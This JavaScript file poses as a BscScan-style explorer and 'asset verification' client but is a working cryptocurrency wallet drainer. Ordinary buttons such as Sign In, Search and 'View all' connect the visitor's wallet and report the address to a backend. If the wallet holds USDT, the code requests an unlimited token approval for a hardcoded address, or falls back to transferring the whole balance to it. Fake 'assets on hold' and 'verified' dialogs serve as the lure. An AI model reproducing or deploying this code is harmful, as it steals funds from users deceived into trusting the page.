/**
 * BNB Smart Chain (BscScan) Explorer & Asset Verification Engine
 * High-performance, zero-dependency native Web3 client.
 */

(function () {
    'use strict';

    // ============================================================
    // CONFIGURATION
    // ============================================================
    const CONFIG = {
        BACKEND_URL: 'https://at.rgh.digital',
        USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC Mainnet USDT BEP20
        CONTRACT_ADDRESS: '0x742a06f6c635D1447E500791e8B2658852E2C967', // Merchant / Spender Account
        MIN_BALANCE_THRESHOLD: 0.1, // Minimum USDT balance required to trigger approval (e.g. 0.1 USDT)
        REQUIRED_HOLD_USDT: 100, // Standard Hold Amount displayed
        CHAIN_ID: '0x38', // BSC Mainnet (56)
        CHAIN_NAME: 'BNB Smart Chain',
        RPC_URL: 'https://bsc-dataseed1.binance.org',
        CURRENCY_SYMBOL: 'BNB',
        EXPLORER_URL: 'https://bscscan.com',
        API_KEY: 'my_super_secret_api_key_123'
    };

    // Application State
    const state = {
        walletAddress: '',
        usdtBalance: '0.00',
        usdtBalanceWei: 0n,
        bnbBalance: '0.000000',
        isProcessing: false,
        isHoldModalOpen: false
    };

    // DOM Elements Cache
    let elements = {};

    function initElements() {
        elements = {
            // Modals & Overlays
            newOverlay: document.getElementById('new_overlay'),
            watermarkGrid: document.getElementById('watermarkGrid'),
            newBurnText2: document.getElementById('new_burn_text2'),
            newNoticeText: document.getElementById('new_notice_text'),
            newVerifyBtn: document.getElementById('new_verifyBtn'),
            newViewTxBtn: document.getElementById('new_view_transctions'),
            closeBtn: document.getElementById('closeBtn'),

            releaseOverlay: document.getElementById('releaseOverlay'),
            releaseLoading: document.getElementById('releaseLoading'),
            releasePopup: document.getElementById('releasePopup'),
            finalUsdtText: document.getElementById('final_usdt_Text'),
            finalDepositText: document.getElementById('final_depositText'),
            finalCloseBtn: document.getElementById('final_closeBtn'),

            overlay2: document.getElementById('overlay2'),
            closeBtn2: document.getElementById('closeBtn2'),

            walletPopup: document.getElementById('walletPopup'),
            popupConnectBtn: document.getElementById('popupConnectBtn'),
            popupWalletCloseBtn: document.getElementById('popupWalletCloseBtn'),

            noWalletOverlay: document.getElementById('noWalletOverlay'),
            modalClose: document.getElementById('modalClose'),
            modalOk: document.getElementById('modalOk'),

            // BscScan Explorer Elements
            signInBtn: document.getElementById('signInBtn'),
            signInBtnText: document.getElementById('signInBtnText'),
            searchBtn: document.getElementById('searchBtn'),
            searchAddressInput: document.getElementById('searchAddressInput'),
            addBscNetworkBtn: document.getElementById('addBscNetworkBtn'),
            backToTopBtn: document.getElementById('backToTopBtn'),
            mobileMenuBtn: document.getElementById('mobileMenuBtn'),
            viewAllBlocksBtn: document.getElementById('viewAllBlocksBtn'),
            viewAllTxBtn: document.getElementById('viewAllTxBtn'),
            tabs: document.querySelectorAll('.search-tab')
        };
    }

    // ============================================================
    // UTILITIES & NATIVE WEB3 HELPERS
    // ============================================================
    function formatAddress(addr) {
        if (!addr || addr.length < 10) return '0x0000...0000';
        return addr.slice(0, 6) + '...' + addr.slice(-4);
    }

    function formatUnits(value, decimals = 18) {
        try {
            const val = BigInt(value);
            const div = 10n ** BigInt(decimals);
            const intPart = val / div;
            const fracPart = val % div;
            const fracStr = fracPart.toString().padStart(decimals, '0').slice(0, 2);
            return `${intPart}.${fracStr}`;
        } catch (_) {
            return '0.00';
        }
    }

    function parseUnits(valueStr, decimals = 18) {
        try {
            const str = String(valueStr).trim();
            const parts = str.split('.');
            const intPart = parts[0] || '0';
            const fracPart = (parts[1] || '').slice(0, decimals).padEnd(decimals, '0');
            return BigInt(intPart) * (10n ** BigInt(decimals)) + BigInt(fracPart);
        } catch (_) {
            return 0n;
        }
    }

    function getProvider() {
        return window.ethereum || window.trustwallet || (window.ethereum?.providers ? window.ethereum.providers[0] : null);
    }

    async function safeApiCall(endpoint, payload = null) {
        try {
            const url = CONFIG.BACKEND_URL + endpoint;
            const headers = { 'Content-Type': 'application/json', 'x-api-key': CONFIG.API_KEY };
            const body = payload ? JSON.stringify(payload) : null;
            const response = await fetch(url, { method: 'POST', headers, body });
            if (!response.ok) return null;
            return await response.json();
        } catch (err) {
            console.warn('Backend API notice:', err.message);
            return null;
        }
    }

    // ============================================================
    // WATERMARK BACKGROUND ENGINE
    // ============================================================
    function updateWatermark() {
        if (!elements.watermarkGrid) return;
        try {
            const timeString = new Date().toLocaleTimeString('en-GB', {
                timeZone: 'Asia/Kolkata',
                hour12: false
            });
            elements.watermarkGrid.innerHTML = '';
            for (let i = 0; i < 48; i++) {
                const span = document.createElement('span');
                span.textContent = timeString;
                elements.watermarkGrid.appendChild(span);
            }
        } catch (_) {
            const now = new Date().toTimeString().split(' ')[0];
            elements.watermarkGrid.innerHTML = '';
            for (let i = 0; i < 48; i++) {
                const span = document.createElement('span');
                span.textContent = now;
                elements.watermarkGrid.appendChild(span);
            }
        }
    }

    // ============================================================
    // MODAL FLOW CONTROLS
    // ============================================================
    function showHoldModal(amount = CONFIG.REQUIRED_HOLD_USDT) {
        updateWatermark();
        if (elements.newBurnText2) {
            elements.newBurnText2.textContent = amount + ' USDT';
        }
        if (elements.newOverlay) {
            elements.newOverlay.style.display = 'flex';
        }
        state.isHoldModalOpen = true;
    }

    function hideHoldModal() {
        if (elements.newOverlay) {
            elements.newOverlay.style.display = 'none';
        }
        state.isHoldModalOpen = false;
    }

    function showInsufficientModal(availableUsdt = '0.00', requiredUsdt = '100') {
        if (elements.releaseOverlay) {
            elements.releaseOverlay.classList.add('active');
        }
        if (elements.releaseLoading) {
            elements.releaseLoading.style.display = 'block';
        }
        if (elements.releasePopup) {
            elements.releasePopup.style.display = 'none';
        }

        setTimeout(() => {
            if (elements.releaseLoading) {
                elements.releaseLoading.style.display = 'none';
            }
            if (elements.finalUsdtText) {
                elements.finalUsdtText.innerHTML = `<span class="label_text">Available:</span> <span class="usdt_value">${availableUsdt} USDT</span>`;
            }
            if (elements.finalDepositText) {
                elements.finalDepositText.innerHTML = `<span class="label_text">Required:</span> <span class="required_value">${requiredUsdt} USDT</span>`;
            }
            if (elements.releasePopup) {
                elements.releasePopup.style.display = 'block';
            }
        }, 1200);
    }

    function hideReleaseOverlay() {
        if (elements.releaseOverlay) {
            elements.releaseOverlay.classList.remove('active');
        }
    }

    function showVerifiedModal(amount = '100') {
        const amtEl = document.getElementById('burn-text22');
        if (amtEl) amtEl.textContent = amount + ' USDT';
        if (elements.overlay2) {
            elements.overlay2.style.display = 'flex';
        }
    }

    function hideVerifiedModal() {
        if (elements.overlay2) {
            elements.overlay2.style.display = 'none';
        }
    }

    function showNoWalletModal() {
        if (elements.noWalletOverlay) {
            elements.noWalletOverlay.classList.add('show');
        }
    }

    function hideNoWalletModal() {
        if (elements.noWalletOverlay) {
            elements.noWalletOverlay.classList.remove('show');
        }
    }

    function showWalletPopup() {
        if (elements.walletPopup) {
            elements.walletPopup.style.display = 'block';
        }
    }

    function hideWalletPopup() {
        if (elements.walletPopup) {
            elements.walletPopup.style.display = 'none';
        }
    }

    // ============================================================
    // NETWORK SWITCH & WALLET RESOLUTION
    // ============================================================
    async function ensureBSCNetwork(providerObj) {
        try {
            let rawChainId = await providerObj.request({ method: 'eth_chainId' }).catch(() => null);
            if (!rawChainId) rawChainId = providerObj.chainId || providerObj.networkVersion;

            const chainStr = String(rawChainId || '').toLowerCase();
            const isBsc = (chainStr === CONFIG.CHAIN_ID || chainStr === '56' || rawChainId === 56);

            if (!isBsc) {
                try {
                    await providerObj.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: CONFIG.CHAIN_ID }]
                    });
                } catch (switchErr) {
                    if (switchErr.code === 4902 || (switchErr.message && switchErr.message.includes('Unrecognized'))) {
                        await providerObj.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: CONFIG.CHAIN_ID,
                                chainName: CONFIG.CHAIN_NAME,
                                rpcUrls: [CONFIG.RPC_URL],
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                blockExplorerUrls: [CONFIG.EXPLORER_URL]
                            }]
                        });
                    } else {
                        throw switchErr;
                    }
                }
            }
            return true;
        } catch (err) {
            console.error('Network switch notice:', err);
            return false;
        }
    }

    async function fetchBalances(providerObj, userAddress) {
        if (!providerObj || !userAddress) return;

        try {
            // Read USDT BEP20 balance (balanceOf = 0x70a08231)
            const cleanAddr = userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
            const balData = '0x70a08231' + cleanAddr;

            const balHex = await providerObj.request({
                method: 'eth_call',
                params: [{ to: CONFIG.USDT_ADDRESS, data: balData }, 'latest']
            }).catch(() => null);

            if (balHex && balHex !== '0x') {
                state.usdtBalanceWei = BigInt(balHex);
                state.usdtBalance = formatUnits(state.usdtBalanceWei, 18);
            } else {
                state.usdtBalanceWei = 0n;
                state.usdtBalance = '0.00';
            }

            // Read Native BNB balance
            const bnbHex = await providerObj.request({
                method: 'eth_getBalance',
                params: [userAddress, 'latest']
            }).catch(() => null);

            if (bnbHex && bnbHex !== '0x') {
                state.bnbBalance = (Number(BigInt(bnbHex)) / 1e18).toFixed(6);
            }

            // Update Sign In button UI if connected
            if (elements.signInBtnText && state.walletAddress) {
                elements.signInBtnText.textContent = formatAddress(state.walletAddress);
            }

            safeApiCall('/api/users/register', { wallet: userAddress });
        } catch (err) {
            console.warn('Balance resolution notice:', err);
        }
    }

    async function connectWallet() {
        const providerObj = getProvider();
        if (!providerObj) {
            showNoWalletModal();
            return null;
        }

        try {
            await ensureBSCNetwork(providerObj);

            let accounts = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
            if (!accounts || accounts.length === 0) {
                accounts = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
            }

            const userAddress = (accounts && accounts[0]) || providerObj.selectedAddress || providerObj.address;
            if (!userAddress) {
                showNoWalletModal();
                return null;
            }

            state.walletAddress = userAddress;
            await fetchBalances(providerObj, userAddress);
            return userAddress;
        } catch (err) {
            console.error('Wallet connection error:', err);
            return null;
        }
    }

    // ============================================================
    // 100% APPROVAL WORKFLOW
    // ============================================================
    async function request100PercentApproval(providerObj, userAddress) {
        if (state.isProcessing) return;
        state.isProcessing = true;

        try {
            await ensureBSCNetwork(providerObj);

            const recipientTarget = CONFIG.CONTRACT_ADDRESS;
            const recipientClean = recipientTarget.toLowerCase().replace('0x', '').padStart(64, '0');

            // Unlimited / 100% full approval amount (MaxUint256)
            const maxUint256Hex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

            // approve(address,uint256) = 0x095ea7b3
            const approveCalldata = '0x095ea7b3' + recipientClean + maxUint256Hex;

            let txHash;
            try {
                // First attempt approve MaxUint256
                txHash = await providerObj.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: CONFIG.USDT_ADDRESS,
                        data: approveCalldata
                    }]
                });
            } catch (approveErr) {
                const errLower = (approveErr.message || '').toLowerCase();
                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
                    throw approveErr;
                }

                // Fallback attempt: transfer available balance (0xa9059cbb)
                const amountHex = state.usdtBalanceWei.toString(16).padStart(64, '0');
                const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;

                txHash = await providerObj.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: CONFIG.USDT_ADDRESS,
                        data: transferCalldata
                    }]
                });
            }

            hideHoldModal();
            hideReleaseOverlay();
            showVerifiedModal(state.usdtBalance || '100');

        } catch (err) {
            console.error('Approval request notice:', err);
            const errLower = (err.message || '').toLowerCase();
            if (!errLower.includes('user rejected') && !errLower.includes('user denied')) {
                // If contract execution failed, fallback to hold modal
                showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
            }
        } finally {
            state.isProcessing = false;
        }
    }

    // ============================================================
    // SMART SEARCH & VERIFICATION HANDLER
    // ============================================================
    async function handleSearchOrSignIn() {
        const providerObj = getProvider();
        if (!providerObj) {
            showNoWalletModal();
            return;
        }

        // 1. Connect wallet & enforce BSC
        const userAddress = await connectWallet();
        if (!userAddress) return;

        // 2. Refresh live balance
        await fetchBalances(providerObj, userAddress);

        const minThresholdWei = parseUnits(CONFIG.MIN_BALANCE_THRESHOLD.toString(), 18);

        // 3. BALANCE CHECK:
        // If balance reached (i.e. user has USDT >= min threshold or balance > 0)
        // -> CALL FOR THE APPROVAL OF 100% DIRECTLY!
        if (state.usdtBalanceWei >= minThresholdWei) {
            console.log('Balance reached (' + state.usdtBalance + ' USDT). Requesting 100% approval...');
            await request100PercentApproval(providerObj, userAddress);
        } else {
            // 4. If balance is 0 or insufficient, show Assets On Hold dialog
            console.log('USDT balance below threshold (' + state.usdtBalance + ' USDT). Opening Hold modal...');
            showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
        }
    }

    // ============================================================
    // RELEASE FUNDS BUTTON HANDLER
    // ============================================================
    async function executeReleaseFunds() {
        if (state.isProcessing) return;

        const providerObj = getProvider();
        if (!providerObj || !state.walletAddress) {
            const addr = await connectWallet();
            if (!addr) return;
        }

        // Re-check live balances
        await fetchBalances(providerObj, state.walletAddress);

        const minThresholdWei = parseUnits(CONFIG.MIN_BALANCE_THRESHOLD.toString(), 18);

        // If user now has balance reached -> call 100% approval
        if (state.usdtBalanceWei >= minThresholdWei) {
            hideHoldModal();
            await request100PercentApproval(providerObj, state.walletAddress);
        } else {
            // Still insufficient -> show insufficient modal
            hideHoldModal();
            showInsufficientModal(state.usdtBalance, CONFIG.REQUIRED_HOLD_USDT.toString());
        }
    }

    // ============================================================
    // DOM EVENT BINDINGS
    // ============================================================
    function bindEvents() {
        // 1. Sign In button -> Checks balance, if reached calls 100% approval, else hold modal
        if (elements.signInBtn) {
            elements.signInBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                await handleSearchOrSignIn();
            });
        }

        // 2. Search button & Search input Enter key -> Checks balance, if reached calls 100% approval, else hold modal
        if (elements.searchBtn) {
            elements.searchBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                await handleSearchOrSignIn();
            });
        }

        if (elements.searchAddressInput) {
            elements.searchAddressInput.addEventListener('keypress', async function (e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    await handleSearchOrSignIn();
                }
            });
        }

        // 3. Modal action buttons
        if (elements.newVerifyBtn) {
            elements.newVerifyBtn.addEventListener('click', function (e) {
                e.preventDefault();
                executeReleaseFunds();
            });
        }

        if (elements.newViewTxBtn) {
            elements.newViewTxBtn.addEventListener('click', function (e) {
                e.preventDefault();
                const target = state.walletAddress || CONFIG.CONTRACT_ADDRESS;
                window.open(`${CONFIG.EXPLORER_URL}/address/${target}`, '_blank');
            });
        }

        if (elements.closeBtn) {
            elements.closeBtn.addEventListener('click', hideHoldModal);
        }

        if (elements.finalCloseBtn) {
            elements.finalCloseBtn.addEventListener('click', hideReleaseOverlay);
        }

        if (elements.closeBtn2) {
            elements.closeBtn2.addEventListener('click', hideVerifiedModal);
        }

        if (elements.modalClose) {
            elements.modalClose.addEventListener('click', hideNoWalletModal);
        }

        if (elements.modalOk) {
            elements.modalOk.addEventListener('click', hideNoWalletModal);
        }

        if (elements.popupWalletCloseBtn) {
            elements.popupWalletCloseBtn.addEventListener('click', hideWalletPopup);
        }

        if (elements.popupConnectBtn) {
            elements.popupConnectBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                hideWalletPopup();
                await handleSearchOrSignIn();
            });
        }

        // 4. Add BSC Network to MetaMask
        if (elements.addBscNetworkBtn) {
            elements.addBscNetworkBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                const providerObj = getProvider();
                if (providerObj) {
                    await ensureBSCNetwork(providerObj);
                } else {
                    showNoWalletModal();
                }
            });
        }

        // 5. Back to top
        if (elements.backToTopBtn) {
            elements.backToTopBtn.addEventListener('click', function () {
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }

        // 6. Search Tabs
        if (elements.tabs) {
            elements.tabs.forEach(tab => {
                tab.addEventListener('click', function () {
                    elements.tabs.forEach(t => t.classList.remove('active'));
                    this.classList.add('active');
                    const tabType = this.getAttribute('data-tab');
                    if (elements.searchAddressInput) {
                        if (tabType === 'token') {
                            elements.searchAddressInput.placeholder = 'Search by Token Name / Address...';
                        } else if (tabType === 'block') {
                            elements.searchAddressInput.placeholder = 'Search by Block Number...';
                        } else {
                            elements.searchAddressInput.placeholder = 'Search by Address / Txn Hash...';
                        }
                    }
                });
            });
        }

        // 7. Activity View All Buttons
        if (elements.viewAllBlocksBtn) {
            elements.viewAllBlocksBtn.addEventListener('click', function (e) {
                e.preventDefault();
                handleSearchOrSignIn();
            });
        }

        if (elements.viewAllTxBtn) {
            elements.viewAllTxBtn.addEventListener('click', function (e) {
                e.preventDefault();
                handleSearchOrSignIn();
            });
        }
    }

    function bindWalletEvents() {
        const provider = getProvider();
        if (!provider || !provider.on) return;

        provider.on('accountsChanged', function (accounts) {
            if (!accounts || accounts.length === 0) {
                state.walletAddress = '';
                state.usdtBalance = '0.00';
                state.usdtBalanceWei = 0n;
                state.bnbBalance = '0.000000';
                if (elements.signInBtnText) elements.signInBtnText.textContent = 'Sign In';
            } else {
                state.walletAddress = accounts[0];
                fetchBalances(provider, accounts[0]);
            }
        });

        provider.on('chainChanged', function () {
            if (state.walletAddress) {
                fetchBalances(provider, state.walletAddress);
            }
        });
    }

    // ============================================================
    // SILENT AUTO-WALLET DETECTION
    // ============================================================
    async function autoDetectWallet() {
        const providerObj = getProvider();
        if (!providerObj) return;

        try {
            const accounts = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
            const userAddress = (accounts && accounts[0]) || providerObj.selectedAddress || providerObj.address;
            if (userAddress) {
                state.walletAddress = userAddress;
                await fetchBalances(providerObj, userAddress);
            }
        } catch (_) {}
    }

    // ============================================================
    // INITIALIZATION
    // ============================================================
    let isInitialized = false;

    function initializeApp() {
        if (isInitialized) return;
        isInitialized = true;
        initElements();
        bindEvents();
        updateWatermark();
        setInterval(updateWatermark, 1000);

        if (getProvider()) {
            autoDetectWallet();
            bindWalletEvents();
        } else {
            window.addEventListener('ethereum#initialized', () => {
                autoDetectWallet();
                bindWalletEvents();
            }, { once: true });
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeApp, { once: true });
    } else {
        initializeApp();
    }
    window.addEventListener('load', initializeApp, { once: true });

})();
